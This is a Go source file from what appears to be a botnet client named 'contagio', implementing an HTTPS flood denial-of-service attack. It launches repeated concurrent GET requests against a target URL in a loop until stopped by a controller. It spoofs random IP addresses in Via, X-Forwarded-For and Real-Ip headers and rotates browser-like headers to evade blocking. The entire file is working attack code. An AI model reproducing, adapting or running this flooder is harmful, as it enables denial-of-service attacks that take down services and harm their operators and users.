package methods

import (
	"contagio/bot/config"
	"contagio/bot/utils"
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"strconv"
	"time"
)

func HttpsMethod(ctx context.Context, url string, port string, id int, ch chan int) {
	defer Catch()

	if config.DEBUG {
		fmt.Println("[https] Attack started")
	}

	for {
		select {
		case <-ctx.Done():
			if config.DEBUG {
				fmt.Println("[https] Attack stopped")
			}
			return

		case sid := <-ch:
			if id == sid {
				if config.DEBUG {
					fmt.Println("[https] Attack stopped (by client)")
				}
				close(ch)
				return
			}

		case <-utils.StopChan:
			if config.DEBUG {
				fmt.Println("[https] Cpu balancer")
			}
			time.Sleep(5 * time.Second)
		default:

			rand.NewSource(time.Now().UnixNano())
			go https(url)
			go https(url)
			go https(url)

			time.Sleep(150 * time.Millisecond)
		}
	}

}

func https(url string) {
	defer Catch()

	client, req := newreq(url)

	for i := 0; i < 30; i++ {
		client.Do(req)
		time.Sleep(10 * time.Millisecond)
	}
}

func newreq(target string) (*http.Client, *http.Request) {

	defer Catch()

	ip := strconv.Itoa(rand.Intn(255-5)+5) + "." + strconv.Itoa(rand.Intn(255-5)+5) + "." + strconv.Itoa(rand.Intn(255-5)+5) + "." + strconv.Itoa(rand.Intn(255-5)+5)

	var client *http.Client

	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return nil, nil
	}

	req.Header.Add("Pragma", "no-cache")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Sec-Fetch-Dest", "empty")
	req.Header.Add("Sec-Fetch-User", "?1")
	req.Header.Add("Sec-Fetch-Mode", "navigate")
	req.Header.Add("Sec-Fetch-Dest", "empty")
	req.Header.Add("User-Agent", utils.GetUserAgent())
	req.Header.Add("Via", ip)
	req.Header.Add("X-Forwarded-For", ip)
	req.Header.Add("Real-Ip", ip)
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Accept-Encoding", "gzip, deflate, br")
	req.Header.Add("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
	req.Header.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")

	client = &http.Client{
		Timeout: 5 * time.Second,
	}

	return client, req
}
